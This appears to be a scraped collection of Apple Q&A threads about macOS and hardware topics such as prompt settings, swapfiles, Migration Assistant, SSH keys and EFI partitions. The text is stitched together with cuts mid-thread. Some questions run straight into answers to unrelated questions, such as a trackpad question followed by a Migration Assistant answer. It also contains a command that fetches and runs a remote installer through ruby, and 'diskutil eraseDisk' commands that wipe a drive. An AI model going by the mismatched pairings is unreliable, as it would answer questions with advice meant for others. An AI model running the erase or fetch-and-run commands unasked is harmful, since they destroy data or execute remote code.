settings? So, I wanted to add a timestamp to my terminal prompt and I followed this  askUbuntu answer to do so. And it works fine. In my terminal preferences I have set the new tab to open the present working directory. After adding the export PROMPT_COMMAND in .bash_profile, however my new tab opens the default directory. When I comment out that line, it works normally again. \nWhy does this happen? How can I get timestamps on my terminal prompt without messing up my new tab settings\n\nA: The problem is that PROMPT_COMMAND is used by the system bash to enable per-session history. If you look at /etc/bashrc_Apple_Terminal you see\n# Note that this uses PROMPT_COMMAND to enable per-session history\n# the first time for each new session. If you customize PROMPT_COMMAND\n# be sure to include the previous value. e.g.,\n#\n#   PROMPT_COMMAND=\"${PROMPT_COMMAND:+$PROMPT_COMMAND; }your_code_here\"\n\nSo if you want to follow the recommendations in the advice you've linked to you are better off just using\nexport PS1=\"\\t [\\u@\\h \\W]\\\\$ \\[$(tput sgr0)\\]\"\n\nor similar. If you really want to use PROMPT_COMMAND\nPROMPT_COMMAND=\"${PROMPT_COMMAND:+$PROMPT_COMMAND; }echo -n \\[\\$(date +%H:%M:%S)\\]\\ \"\n\nbut the prompt will get messed up if you navigate back in time with Ctrl-P.\n", "Q: Is it safe to remove /vm/swapfile0? I found a file of size 1 GB in /vm/swapfile0, that has not been accessed in a long time, according to last access date value in ls -l. \nMy assumption is, that this file is left over from an older macOS version. The last access was probably before I upgraded to 10.12. Can I safely remove it?\nI also found some files of size 1 GB in /private/var/vm. These have recent access times; both sleepimage and swapfile1 today and swapfile0 two weeks in the past. I think these are in active use.\nOne side question though: sleepimage has a size of 1 GB, although I have 4 GB RAM installed. How is that possible? Other threads on the topic of sleepimage suggested that the size would match that of the RAM installed in my Mac.\n\nA: The system reserves that file and cleans excess on restart. I'd leave it alone whether it's safe or not to prune (or attempt to prune). The system compresses memory and needs to have this space to offload any memory that's paged out so there's not a need for 1:1 RAM to swap allocation.\nThere are many other files you will want to focus on if you feel storage is growing out of check or you want to free up space on a boot drive. Deleting a file that will just be recreated, likely less contiguously than when you had more space available isn’t a sustainable clean up activity. Consider moving photos, music and movies to external storage or deleting apps if you have no large user files you can clean or move.\n\nA: Boot up in Recovery mode and use the Terminal to remove the swapfile0 file. That is fully safe to do.\n", "Q: How to configure a Trackpad to connect automatically to two different Macs? I have a private Trackpad, which I use at work also.

What is the best way to do that?\nI tried taking some of the apps and saving copies in Dropbox and then opening from the new Mac. That didn't work.\n\nA: Your best bet for an automatic process is running Migration Assistant on the new / destination Mac. It will ask you to connect the old Mac in target disk mode or connect a Time Machine backup of the old Mac. If you don’t want to use target disk mode - you can also use Disk Utility / Carbon Copy Cloner / Super Duper to make a bootable clone of your old Mac to an external drive and connect that when Migration Assistant asks for the old Mac to be connected.\nFrom there - it can move over user accounts, applications and/or settings and other files from the old Mac to the new Mac.\nLots of good examples here:\n\n\n*\n\n*Migrating to new iMac, what does Migration Assistant actually migrate?\n\n*Recovering all my old settings, apps etc ... from removed hard drive\n\n*Best way to move to a new Mac\n\n*How can I transfer data from a G5 iMac to an i7 iMac?\n\nA: The best approach would be to reinstall the apps afresh. However, that may not always be desirable, as it will involve a lot of work.\nFor e.g. user has heavily customised the apps, the apps have a lot of preferences items which the user has spent hours tweaking, or the apps have plugins that the user has installed etc.\nWith fresh install approach, these actions will be have to be meticulously repeated and is prone to human error.\nTo handle this scenario, preferences export can be performed in various ways. For e.g. many apps save their preferences in file(s) under Library. If such file(s) can be reliably identified, the user can copy them over in the corresponding location in the new system. Some apps maintain their preferences in an easily accessible configuration text files which can be copied over.\nThe previous approach may still involve a lot of work and may not be desirable. A simpler approach would be using macOS Migration Assistant. This feature lets you easily transfer settings, apps and data from one Mac to another.\nA very helpful and concise guide on Migration Assistnat and its usage can be found in the Apple Support Article, How to move your content to a new Mac.\n", "Q: iTunes truncates MP3s.

Please try again later.\n\n(Needless to say, trying again later has not helped.)\nI am pretty sure the problem is that I never \"purchased\" Yosemite; by the time I went to install it on a previous machine only El Capitan was available in the app store, and unfortunately there seems to be no way to retroactively \"purchase\" Yosemite, which is a bit of a problem in this case.\nHow can get macOS installed on this machine again—ideally without needing another machine (both because it is inconvenient, and because of the risk that the other machine might be compromised)?\n(I am not too fussy about which version I get, since I probably want High Sierra in the end and can upgrade easily enough.)\n\nA: You are correct - the issue you have is that Yosemite is not in your Purchased history.\nWith your MBP and its history, you should have three options open to you:\n\n\n*\n\n*commandR to reinstall the latest macOS that was installed on your Mac, without upgrading to a later version \n\n*optioncommandR to upgrade to the latest macOS that is compatible with your Mac\n\n*shiftoptioncommandR to reinstall the macOS that came with your Mac, or the version closest to it that is still available1\n1 That third option is a new option only available when macOS Sierra 10.12.4 or above has been installed.\nObviously we can't be 100% sure what version of macOS was pre-installed when new, but it most likely would have been Yosemite 10.10.2.\nI would try rebooting your MBP again using each of the above combinations one by one to test what happens, as it may be you can successfully reinstall macOS with one of them.\nLet me know how you go.\n", "Q: Open a file with spaces in the name in Terminal How do you open a file which has spaces in the filename using Terminal on Mac?\nI've seen some pages that say type: \"open FileName\" and it works for files that are one worded. But I would like to open a picture that is named: \"Test Subject.jpg\".\nI've already tried: \"open Test Subject.jpeg\" and \"open TestSubject.jpeg\" but none will open it.\nHow can I open a picture or video on Terminal if there is more than one word in the \"FileName\" e.g. Test Subject.jpeg?\n\n\nA: Either escape the space with a backslash or use quotes.\nopen Test\\ Subject.jpg\n\nopen \"Test Subject.jpg\"\n\nYou can also use autocomplete with tab. Type open Test then ⇥ to autocomplete.\nTake note of the extension and make sure you use the right one. You've used 3 different extensions in your question, only the right one will open the file.

You can create this workflow as a service to receive a PDF document and add a watermark to it.\n\n", "Q: Repair shop suggests to solder new graphics chip onto a used graphics card Recently, my 27\" iMac Mid-2011 had a graphics card failure (an AMD Radeon HD 6970M 2GB GDDR5).\nEven though the computer now is vintage-classed, I still want to repair it. Unfortunately, Apple-authorized service partners are not allowed to service vintage-classed computers, so I had to turn it in to an unauthorized service shop.\nThe service technician claims to have found a used ATI HD 6970M 1GB from some secondary market supplier online. Since the card is used, he recommends that the supplier solders a new non-used ATI chip of the same type onto the graphics card board.\nI have never heard of this procedure before and I am unsure if this is a recommendable idea. My concerns are are mainly if this is:\n\n\n*\n\n*(A) At all recommendable to cushion against chip failures of a used card.\n\n*(B) If there are any safety concerns (e.g. electricity risks) due to doing this.\n\n\n\n(The cost of the soldering operation is not a major concern although it has bearing, he says the soldering of the new chip will be $35 USD, added to the price of the used card which sells for $520 USD).\n\nA: Speaking from experiences in the repair community: Its unlikely that its actually a new unused chip. A lot of sellers try to find working chips and clean them and brand them as new. (Some even going as far as lasering in a new date code to make them look like they came from a recent batch, even though the chip has not been produced for a while).\nEven if the graphics chip would be new it has the same design faults in there that made it die in the first place. That combined with being unsure about the practices, heat settings and how the chip was stored makes it very uncertain for how long it will last. \nMy advice: If the store is willing to do this for less then $80 you might want to give it a try (while also saving up for a new device), higher then that and I personally wouldn't risk it.\nTo answer your second question, there aren't many safety concerns. If a graphics chip shorts out the system will just disable power. I would say the electrical risk is close to none and not more then it has always been\n", "Q: Renewed Apple developer account with wrong credit card I paid my Apple developer account membership (renew) order with my brothers credit card. What to do? Can I cancel this order and renew again with my credit card?\n\nA: There isn't any issue if the payment has made though and your account is renewed. You can simply pay back your brother :)\nIn theory you should be able to contact Apple Developer support and ask for a cancellation, but since you said you wish to renew anyways, I don't think it is necessary. If you are concerned that your card may get charged by Apple Developer for some developer service, be assured that there's no other charges associated with Apple Developer Program membership, that may get billed on your card without your consent.\nNext year, when renewing, you can use your card again. Please note not to use your brother's card again without thinking twice!\nIt is possible to change the payment method associated with your Apple ID anytime.\n", "Q: Safari Reading List not syncing I am a mobile app dev, so asking something as basic as this is a tad embarrassing, but I just don't seem to understand what I need to do to have my Reading List sync between my Apple devices. I have the sync over Wi-Fi setup on each device, have done this while cabled to my MacBook pro, done a sync, am powered, on the same Wifi, even prayed to the moon, but no syncing being done.\nI have searched for a clear set of instructions, but with Apple changing the layout of Settings so often, all I have found are hopelessly out-of-date.\nPointers, tips, incantations are welcome! thanks.\n\nA: On macOS, go to System Preferences → iCloud and check Safari.\n\nOn iOS, go to Settings → Apple ID → iCloud and turn on Safari.\n\n\n\n\nA: I work in IT myself and had this problem just now on my 2017 MBPro 13\". I would add to the Reading List on my iPhone X and they were not updating on the MBPro.\nI had all the items checked off as well. I went and turned OFF the Safari option on the MBPro, waited about 10 secs, then toggled it back on. It took about 30+ seconds or so and then FINALLY the list updated.\nI'm thinking the toggle Off & On finally triggered it to update.\nHope this helps.\nI've read on other forums this has worked for some and not for others, thankfully it did for me.

The keyboard shortcut to take you immediately to the Mission Control system preference pane is OptionMission Control.\nNote: The Mission Control key on an Apple keyboard is the same key as the F3 key. \n", "Q: USB-C to Displayport cable or adapter I'm using MacBook pro 2017 15 inch and i just got 3x DELL U2518D UltraSharp monitors to connect to my macbook pro.\nWhat I actually need is best possible solution to connect this external monitors to my macbook pro. Should i use USB-C to DisplayPort adapter or should i go with USB-C to DisplayPort Cable? \nWhat is difference? Is cable better? Or adapter?\n\nA: Use a Type C DisplayPort cable.\nThe ports on your MacBook Pro are Thunderbolt 3 which is a multiplexing of multiple signals:\n\n\n*\n\n*PCIe\n\n*USB 3.1\n\n*DispayPort\n\n*Power\n\n\nSince it natively supports DisplayPort, you want a cable, not an adapter.\nDifference between cable and adapter\n\n\n*\n\n*A cable is just an interconnect between a source and an end device using the same signaling\n\n*An adapter creates a signal from one to another (from USB to DVI or HDMI)\nIn this case, a cable is \"better\" because it's not converting any signals.  Less conversion means better reliability.\n", "Q: Running multiple git ssh logins via Terminal I recently set up an SSH key for by Bitbucket account, which works very nicely. But I also have other git repos like Github, GitLab (non ssh at the moment) and I came to push to one of those other accounts and I think the Terminal defaulted to use my bitbucket ssh keys.\nSo how would I force Terminal to either let me login with a username and password when using a github repo, or let me pick which ssh keys to use, say I had setup up keys for Gitlab and Github? \n\nA: There a different ways of achieving this.\n\n\n*\n\n*you could use the same key for all your git repos.\n\n*you could use different keys and specify which one to use when logging into a remote system:\n$ ssh -i ~/.ssh/bitbucket-key user@host\n$ ssh -i ~/.ssh/gitlab-key user@host\n\n\n-i identity_file \nSelects a file from which the identity (private key) for public key authentication is read. The default is ~/.ssh/id_dsa,\n  ~/.ssh/id_ecdsa, ~/.ssh/id_ed25519 and ~/.ssh/id_rsa. Identity files\n  may also be specified on a per-host basis in the configuration file.\n  It is possible to have multiple -i options (and multiple identities\n  specified in configuration files). If no certificates have been\n  explicitly specified by the CertificateFile directive, ssh will also\n  try to load certificate information from the filename obtained by\n  appending -cert.pub to identity filenames.\n\nI would create a key pair for each git repo, then in Bitbucket you would upload the key to the Bitbucket website. Gitlab and Github work the same way.\nOnce you uploaded your key to your repository it is enough to git push without need to specify your key.\n", "Q: Transfer student Apple Care to another user I was wondering, if I purchased Apple Care as a student can I transfer it to someone else when I sell the device(s)? I've found a similar question on here but it didn't address specifically Apple Care purchased as a student.\nAlso if it is possible, how do you do this?\n\nA: Yes, you can transfer AppleCare to another person subject the terms and conditions in the location you live.  Whether this is a student-purchase or not doesn't make a difference.\nYou didn't mention the country you live so I'll assume you're in the US for this info.

The general consensus is that older Macs can run Mojave if they have a graphic card supporting Metal (c.f. appleinsider for example). But Metal-readiness comes in different degrees. Has Apple disclosed what is the lowest bar yet?\n\nA: The article Apple Outlines Metal-Capable Cards goes into the detail needed.\nFrom linked article --\n\nAccording to Apple, the following graphics cards are known to be\n  Metal-capable and compatible with macOS Mojave on the mid-2010 and\n  mid-2012 Mac Pro models:  \n  \n  \n*\n  \n*MSI Gaming Radeon RX 560 128-bit 4GB GDDR5\n  \n  \n*\n  \n*SAPPHIRE Radeon PULSE RX 580 8GB GDDR5\n  \n*SAPPHIRE Radeon HD 7950 Mac Edition\n  \n*NVIDIA Quadro K5000 for Mac\n  \n*NVIDIA GeForce GTX 680 Mac Edition\n  \n  \n\n\nA: Metal is required to run the OS. Apple has deprecated OpenGL and OpenCL and additionally is now using Metal exclusively to render the GUI.\n\nIf your Mac does not support Metal, the user interface will not be able to run, and as a result Mojave will not boot.\n\nA: From Metal (API) - Wikipedia:\n\nMetal 2 is not a separate API from Metal and is supported by the same hardware. Metal 2 enables more efficient profiling and debugging in Xcode, accelerated machine learning, lower CPU workload, support for virtual reality on macOS, and specificities of the Apple A11 GPU, in particular.\n\n", "Q: MacBook Pro doesn't re-connect to Wi-Fi, iPhone does I have been wondering for long (and being troubled by this too), that why don't MacBook (like most other laptops), don't connect automatically to the available Wi-Fi like iPhone (and most other phones) do.\nE.g. if my Wi-Fi router goes off for 1-2 minutes, both iPhone and MacBook Pro disconnect from it (obviously), however when the network is back, after a few seconds, iPhone is back on network, while MacBook isn't (even after long!).\nSo I want to know why is it so? And more importantly, how to change that behaviour and make it auto-connect?\n\nA: You should check System Preferences > Network and click the Advanced... button to pull up the list of saved Preferred Networks. There is an option to drag networks in a preferred order. If your home network is not at the top of the list, drag it up. If your home network is the only network in this list, select it and hit the negative button to delete it, then recreate a new Wi-Fi connection.\nSidenote: If you are using iCloud Keychain, Wi-Fi networks you have connected to on any device also using iCloud Keychain will show up on your Mac and visa versa. This can cause a proliferation of Wi-Fi networks in this list.\n\n", "Q: pfctl to add rules at runtime WITHOUT editing /etc/pf.conf? I have an app that (while it is running and only while it is running) needs to make changes to the packet filter (pf) so that it blocks or allows certain traffic.

Disabling SIP not required.\nNo need for homebrew or any other package handler to install a precompiled binary. You do need to read up on basic UNIX though.\n\nA: The problem is bash is looking for ffmpeg in directories list in the $PATH. Some of these directories are protected by SIP and therefore you would need to disable SIP to put the file in these directories. Alternatively, you can install it using Homebrew.\nFirst install HomeBrew with this command:\n/usr/bin/ruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\"\n\nThen install ffmpeg with this command:\nbrew install ffmpeg\n\nHomebrew will install ffmpeg in a path not protected by SIP, but within the $PATH, more specifically it will install it under the  /usr/local/bin directory.\nThis can be done manually with manual commands (basically manually doing what homebrew does. For this approach check out @davids answer. But I would suggest homebrew for multiple reasons. Its much easier to use and quicker to install a large amount of tools. You can also update much faster. Homebrew also makes installing dependencies easier.\nEdit: I previously had a part of this answer with inaccurate information I have since changed it. I believe it is currently accurate. I have included the part about SIP because I think it is important to understand what restrictions there are regarding placement of commands and why there isn't just a single path for all commands.\n\nA: The terminal shell of macOS, as in Windows or Linux, is looking in the $PATH environment variable to locate binaries.\nYou can check your $PATH variable doing :\necho $PATH\n\nWhich outputs in standard recent macOS :\n/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin\n\nYou either have to put a copy of the binary in one of those directory (preferably /usr/local/bin as it is not SIP-protected) or add another directory in your $PATH environment variable.\nThe best practice is generally to store your application elsewhere (e.g. /lib) and to only put a symlink in the bin directory pointing to the binary itself.

I'm selling my MacBook to a friend and obviously want to return it to its newborn state before I do so, following the steps outlined in the Apple support article, What to do before you sell or give away your Mac.\nWhat I can't tell, however, is whether non-standard apps such as Excel for Mac will remain on the MacBook after the process is completed. It would be useful for her to have them.\n\nA: Yes.\nFormatting your hard disk and performing a fresh installation of macOS will delete all the apps (both Apple and 3rd party) which are installed on top of fresh install of macOS.\nAs per your requirements, you can take either one of the following two approaches:\n\n\n*\n\n*Erase your hard drive and reinstall macOS\n\n*Create a brand new administrative user account and delete all the other accounts in the system.\nHowever, irrespective of whichever two of the above approach you take, make sure to backup/move all your data from the MacBook (primarily from under your home directory), sign out of all the Apple services from your account (iCloud, iMessage, iTunes, Mac App Store), remove any saved Wi-Fi passwords and other sensitive items in the Keychain and unpair any paired Bluetooth device(s).\nIf you take the second approach from the list above, all the installed apps (other than the ones available in a fresh install of macOS) will continue to remain available on your Mac.\nHowever, as mentioned by @nohillside, there may be licensing issues for commercial apps.\nWhen following the second approach, you'll have to login once into the new account and delete all the accounts from Users & Groups in System Preferences.\n\nA: Straight answer is Yes.\nAs you format the HD, all contents are deleted. With the new installation of macOS, you will have only Apple apps. Third party apps will be deleted. Your friend can install third party apps as per his/her liking.\n\nA: If you wipe the HD and reinstall MacOS, and the laptop isn't restored from a backup or signed in to your app store account it won't have any apps that didn't come with it originally.\n", "Q: See which app drained my Macbook's battery Sometimes I close my laptop, assuming that there is nothing running that prevents sleep, put it in my bag, and then find the next day that it didn't sleep - instead it ran out of battery and shut down.\nIs there any way to see which apps or processes were preventing it from sleeping? It doesn't do this always so I don't want a manual method I have to do before I close the lid.\nNote I am not asking which processes are currently draining the battery.\n\nA: I commented this but realized it is really just a solution.

By selecting my current disk, I press \"+\" multiple time and then press \"-\" until i was back to a single partition, it shows that i have 165 GB (original amount). But when i press \"apply\", I cannot partition my current disk.\n\n\n\n\n\nA: To remove Boot Camp, one is meant to use Boot Camp Assistant which provides an automated workflow for editing the partitions on your disk back to pre-Windows. You may still be able to use it in this state — try opening Boot Camp Assistant and choose Remove Windows if the option exists.\nYou can partition manually in Disk Utility. Choose Partition, delete NO NAME and resize the APFS container to the rest of the free space on the disk.\n", "Q: How can I search 360,000 files, about 280 GB? I have a folder (technically in this case, a read-only mounted disk image) containing a ton of data I got by running Data Rescue (a data recovery app) on one of my large server drives. I did several different scan types and dumped all the files into one place. Data Rescue 'reconstructs' deleted files and often doesn't get it quite right. It can miscategorize the type of file it is, and it can mash separate files together. \nI am seeking two specific PHP files (and maybe about 5 others if I get lucky). Most of these recovered files don't have names (0002, 0003 etc), so I have to search by content. \nI've come up with 6 different strings that should be able to identify these specific files. So I need a way to search the contents of files, not in an Apple \"magic search\" kinda way, but in an old school \"manually read through every file looking for a string-match\" kinda way.\ngrep sounds like the obvious choice, but it's been nothing but problems. grep can search recursively, and it can decompress gzip, zip and bzip archives, which is all good. But after a few minutes of running, it starts streaming \"too many open files\" errors. I'm not sure why, it's as if grep doesn't close a file after it opens it to search in it. I've also had issues with grep just stopping... not quitting, not crashing, not going unresponsive, but not using any more CPU, not reading anything from the disk, just sitting idle when it should be searching. I ALSO had trouble running multiple grep searches at once. grep seems to load files line by line, so something like a disk image gets the entire thing loaded into memory before searching. But there is only one file in this whole bundle that is larger than the amount of RAM I have. So as long as I do one grep at a time, I should be fine. \nThis is the command I'm using (wrapped in a script that does several commands to different output files, with some status outputting):\nzfgrep -l -r -a -J -i -s -U -n \"#32cd32\" /Volumes/\\'Storage\\'\\ Original\\ Recovery > 32cd32.txt\nThis will run for a while, then it will hang. I'll get some results but not a full search. If I remove the -s, I get the flood of too many open files errors. Then, at someone else's suggestion, I use find to feed files to grep one at a time, like so:\nfind /Volumes/\\'Storage\\'\\ Original\\ Recovery -exec zfgrep -l -r -a -J -i -s -U -n \"#32cd32\" {} \\; -print > 32cd32.txt\nBut that command has the exact same problems. \nSo this leaves me stuck. How can I search every single file on this disk image, including the archives, for some plain text strings. Including binary data files that may have been incorrectly merged with plain text files? This doesn't seem like that tough of a task for a modern multicore computer with a current OS, lots of RAM and a SSD. \nI actually would prefer a GUI option, but at this point I'll take any solution that works. \nAlso I originally started trying to do this using BBEdit, but it was skipping a LOT of filetypes even when you tell it to search all files. Even files that are XML based. I was very surprised by this. \n\nA: Using find ... -exec grep -r effectively traverses the whole directory several times (once as part of the find, once as part of each grep -r) which may lead to the errors you see. So you should either get rid of the find or the -r. As you use the grep part to identify the files to be collected, it's probably the -r in your case.\n", "Q: See upload and download speeds of each process Is there a way I can see the internet bandwidth being used by each process on my MacBook?\n\nA: iStat Menus has this functionality in the Network menu bar item.

I will post pictures below but in a nutshell I had a 1 TB drive in my MBP that was almost full. While it was taking an update a few weeks ago it became corrupt. I used the Time Capsule sucessfully to restore the drive and used it for about two weeks before attempting this HDD upgrade to the two TB.\nThis time the restore will run overnight or 1 hour or any random amount of time before I get the error message. I thought perhaps that I had a heat issue so I’ve moved things around to keep both the MBP and the TC cool. \nIt almost finished last night after placing the old HDD in and doing a inspection of the backup on the TM. It was actually doing a “clean up to the restore” when I went to bed only to fail again.\nI am trying this using the Ethernet port although the back ups were done via wireless. My MBP is a late 2011 model and the TC was purchased in 2012. I still have the complete 1 TB HDD that I can fall back on if need be. Any advice is greatly appreciated.\n\n\n\n\n\nA: I find it quite odd that Time Machine refuses to completely restore a backup onto your Mac. I do not know the reason for this, but try these methods (I honestly do not think it is a hardware problem):\n\n\n*\n\n*Restore from a older backup.\n\n*Install MacOS completely, and try to backup with migration assistant.\n\n\nThese methods may take some time, but hopefully they work.\n", "Q: How to put a long picture overlay on top without imovie making the image scroll This has to be the most annoying thing in iMovie.

There's no way to connect anything but the supported notebooks to this dock. \n\nThe key here is to understand that the HP dock is not an \"independent device.\"  It's designed for convenience when wanting to use desktop peripherals (mouse,monitor,keyboard, LAN, etc.) with your notebook; consider it part of your HP notebook when docked.  \nTo share devices, you need \"something\" that interfaces with the peripherals that can be connected to both machines.\nYour only options are to:\n\n\n*\n\n*Ditch the dock and use a generic USB hub/dock and manually move the USB cable between computers\n\n*Get a Bluetooth mouse/keyboard (like the Logitech MK850) that supports multiple devices (won't support video switching)\n\n*Get a quality KVM switch that supports multiple monitors\n\nA: Actually you should be able to keep the HP dock and just treat it as a generic PC workstation. You would do your switching between the dock and the monitors and other peripherals.\nSince the HP does not have USB-C plugging a dock between the two computers will not work.\nNote that USB-C cables support Thunderbolt-3 so a USB-C cable will work for monitors and other things. Don't confuse USB-C with USB-3, the latter looks like a standard USB connector (often blue on PCs) the former are much smaller connectors.\nA lot of this is finding something that works for you and without getting our hands on the actual hardware it is going to be difficult for us to make a specific recommendation that will work in your use case. So this is mostly a \"bombard you with info so you can find a solution that works for you.\" situation.\nAlso my earlier comment about RDP. I have noticed that if you run the Microsoft Mac RDP client to connect to a PC it is very fast, just like sitting in front of the PC. So if you leave the HP on but not connected to keyboard/monitors/etc (just network) you can access it from a Mac at pretty much full speed. Allowing you to just hook up the Mac to your monitors/etc and not worrying about all the hardware switching.

In summary:\n\n\n*\n\n*It wasn't specifically the Quadra 840AV, it was any PCI Power Mac with Mac OS System 7.5.5 to 7.6.1 installed.\n\n*It wasn't accessed at boot time either. All you had to do was launch any text application that supported drag and drop and then type the following text into it: secret about box (exactly as I've typed it here, no capitals, or punctuation marks! Then if you dragged the text to the desktop, you'd see the picture you're referring to (see below):\n\n\n\n\n\n*\n\n*Yes, you could control the flag by moving the mouse around (i.e. you could use the mouse to control the wind direction, thereby changing the flag).\n\n*Yes, you could rip the flag off the flag pole by using your mouse to make the wind stronger. This was done by moving the mouse up and down quickly in just the right spot.\n\n\nAs an aside, the text below the iguana on the flag: \"iguana iguana powersurgius\" is a reference to the code name used for the PCI Power Macs (i.e. PowerSurge).\n", "Q: Apple Xserve (Early 2009): Has anyone installed PCIe SSD in PCI-E slot? I am reconfiguring a working Apple Xserve (Early 2009) [Xserve3,1][model A1279][MB449LL/A] which does not currently have an SSD installed, neither the factory 128GB SATA, nor any aftermarket.  I'm planning to replace the standard 3-drive SATA Drive Interconnect Backplane with the Apple Xserve RAID Card.  The fans howl something fierce, so I plan to replace the Fan Array.  I also plan to replace the single processor Logic Board with the dual processor Logic Board.\nIt seems to me that performance would be better, and overhead lower if I install a current generation PCIe SSD in the PCI-E Riser Card (ie, PCIe “backplane”), rather than install an Apple circa-2009 SATA SSD (which connects through the Front Panel Board). \nHas anyone successfully installed a PCIe SSD in an Xserve PCI-E Riser Card?\n\nA: I'm running a 2009 Xserve on a Plextor M6e 256GB (PX-AG256M6e) and it works great. I also just installed 10.11.6 on a Samsung SM951, AHCI version (PN MZHPV256HDGL). As far as I can tell, it must be the AHCI version and not the NVMe version to work. I put it on a StarTech PEX4M2E1 M.2 PCIe adapter.

It seems to work fine.  But I want to scan for bad sectors just to be safe.  I use this drive for all of my TimeMachine backups.\nThe \"macOS app for showing external HDD usage statistics?\" post is about checking your hard drive and has tools you can buy (recommended by the community), or things you can try which I tried and which did not work.\nOn a Windows machine, you can take any connected drive, run scandisk on it, and detect/repair bad sectors.  Is there a way to do this for my drive on Macintosh (without purchasing third party tools)?\nMore info:\n\n\n*\n\n*Disk Utility -> Info says that SMART status is \"unsupported\".\n\n*The drive is formatted as HFS\n\n\nA: In general you can't get SMART status of a drive in an external case. Some cases will support it, some do only with vendor-supplied software.\nBut SMART isn't all that useful. It's good at telling you the drive HAS a problem, not so good at telling you the drive might have a problem soon. And bad sectors on modern (21st century) drives are already mapped out by the drives controller - any sector that doesn't read reliably will just be mapped to a spare sector and you won't know about it.\nWas the Seagate running when it was dropped? If no, no problem. They're designed to take some minor abuse when turned off. If yes, and you do manage to detect even a single bad sector then just replace the drive. Any bad sector that reaches user levels means the drive is out of spares, and that's probably because the head crash caused by the fall is now dragging a tiny bit of metal all over the platter.\nIn short, if you have any doubts about the reliability of spinning drives these days the most cost-effective route is to replace it. At $25-$60 per terabyte it just isn't worth the considerable time to verify the drive.\n\nA: This article on osxdaily has a lot of good information that relates to this problem.  The process that relates to this question:\n\n*\n\n*Use Mac Disk Utility\n\n*In the UI, click First Aid\n\n*You will be asked: \"check the volume for errors and repair them if necessary\"\n\n*Yes - launches this process\n\n*No - cancels the operation\n\nA GUI window pops up that gives you a status as it runs multiple checks of your hard drive.  In my case, the hard drive came up clean and the report then said nothing about sectors but did indicate my hard drive seemed in good working order.  It gave details about many checks run, just no text about the sectors.\nSomeone else with a hard drive with bad sectors would need to try this to see what it does and what it says when a problem is found with a sector.\n[This test does not scan for bad sectors]\n", "Q: Do I need to go through all Mac OS upgrades? I right now have macOS Sierra, and want to upgrade to the latest Mac OS. Do I need to install high Sierra first?\nAlso, how do I get the upgrade offline files?

Follow the steps below:\n\n\n*\n\n*Open the App Store app on your Mac.\n\n*Search the App Store for macOS High Sierra, or go directly to the macOS High Sierra page.\n\n*Click the Download button on the High Sierra page. If your Mac is compatible with High Sierra, a file named Install macOS High Sierra downloads to your Applications folder.

A few months ago I decided to format an external HD that I wish to use with my Mac mini, but I can not use 100% of it.\nIn the formatting process, a partition called EFI appeared. When I open the Disk Utility app, the partition is not displayed, but it was displayed by the command line using diskutil.\nHere is the Disk Utility:\n\nFrom the command line: diskutil list\n/dev/disk0 (internal, physical):\n   #:                       TYPE NAME                    SIZE       IDENTIFIER\n   0:      GUID_partition_scheme                        *1.0 TB     disk0\n   1:                        EFI EFI                     209.7 MB   disk0s1\n   2:                  Apple_HFS MAC HD                  881.0 GB   disk0s2\n   3:         Microsoft Reserved                         16.8 MB    disk0s3\n   4:       Microsoft Basic Data BOOTCAMP                118.9 GB   disk0s4\n\n/dev/disk1 (external, physical):\n   #:                       TYPE NAME                    SIZE       IDENTIFIER\n   0:      GUID_partition_scheme                        *640.1 GB   disk1\n   1:                        EFI EFI                     209.7 MB   disk1s1\n   2:       Microsoft Basic Data HD Caio                 639.9 GB   disk1s2\n\nHow can I recover the space lost to disk1s1?\n\nA: EFI partition is a partition that stores boot files for operating systems, but since it is an external drive, it's not needed. When you erase your disk and create a new GUID Partitioning Table on it, macOS will automatically create an EFI partition. If you don't want that EFI partition, you have a few options:\n\n\n*\n\n*You can erase your disk and create a new MBR instead of GPT. To do this, follow these steps:\n\n\n*\n\n*Open Terminal. You can use spotlight to find it\n\n*Make sure your external disk is inserted. Type diskutil list and identify your disk (in the output you provided, it looks like it's disk1). \n\n*Type diskutil eraseDisk JHFS+ MYDISK MBR diskX and replace diskX with the actual disk's identifier (for example, disk1)\n\n*Your disk will be erased without an EFI partition now.\n\n\n*You can use diskpart.exe to partition the disk on Windows. Windows doesn't create an EFI partition.\n\n\nA: This works for me, In Mac Terminal\nStep 1. type command to get list of partitions\ndiskutil list\n\nStep 2. to erase/remove EFI partition\ndiskutil eraseDisk JHFS+ MYDISK MBR disk2\n\nNote : MyDisk is new name for your drive and disk to is the drive partition\nStep 3. that,s it.. just check your new structure\ndiskutil list\n\nEFI partition is gone!!\nStep 4. Now remove your drive(USB) and connect to PC\nStep 5. Just Format in normal way and start using.\n", "Q: How process hierarchy works in macOS I'm wondering how Activity Monitor relates these two process if the child (Safari Web Content) doesn't have the ppid of the main one (Safari). pstree, which uses the ppid to organize the tree, shows no relation between them.\n\nHere's another example, caffeinate was launched from a shell script inside BetterTouchTool using nohup, and again pstree doesn't show any relation.\n\nActually what I need is to send a kill signal to \"childs\" like Safari Web Content using shell script or C api knowing only the \"Safari\" pid. And I think this might help.\n\nA: The Safari \"child\" processes are actually children of the init system (launchd which has PID 1) which explains why pstree or other such unix tools cannot make use of the usual parent pid (or process group) relation:\n\n% ps axo pid,ppid | egrep '81921|81925|82022'\n81921     1\n81925     1\n82022     1\n\nInstead you will need to use an Apple API; the launchctl utility indicates that the \"domain\" or \"ASID\" may be relevant:\n% sudo launchctl procinfo 82022 | grep -1 81921\n\n        domain = com.apple.xpc.launchd.domain.pid.Safari.81921\n        asid = 100006\n--\n--\n\nresponsible pid = 81921\nresponsible unique pid = 81921\nresponsible path = /Applications/Safari.app/Contents/MacOS/Safari\n\nBut let's post this info before testing what something like launchctl kill ... does.\n(Also note the above is from Mac OS X 10.11.6, the interfaces may have been changed by Apple since then.)\n", "Q: Disable internal keyboard on high sierra I recently decided to bathe my keyboard in liquid and have lost functionality in my keyboard.

If I download/save an image on iOS, how can I determine what the resolution of that image is?\n\nA: There's no native way to do this within iOS without either installing a 3rd party app or jailbreaking the device. \nThe closest you can get natively is to determine the image file size (i.e. in KB or MB), but obviously this does not provide the resolution.\nAnother option is to import the images to your Mac/PC in which case you can use macOS, Windows, etc to display the resolution.\nIn terms of 3rd party apps, there are countless options on the iOS App Store that can do this for you. If you're interested in more than just resolution than you may want to download an EXIF viewer app, most of which are free.. These will offer a lot of other data from the image and often work with images that are downloaded, not just ones taken with your iPhone camera (although in many of those cases you'll only get a resolution, which is what you're after anyway).\nThere are also photography apps and file management apps that can give you this info, but the built-in iOS Files app won't provide resolution details, just the image type, file size and date.\n", "Q: How to get stationery back in Apple Mail on macOS Mojave?

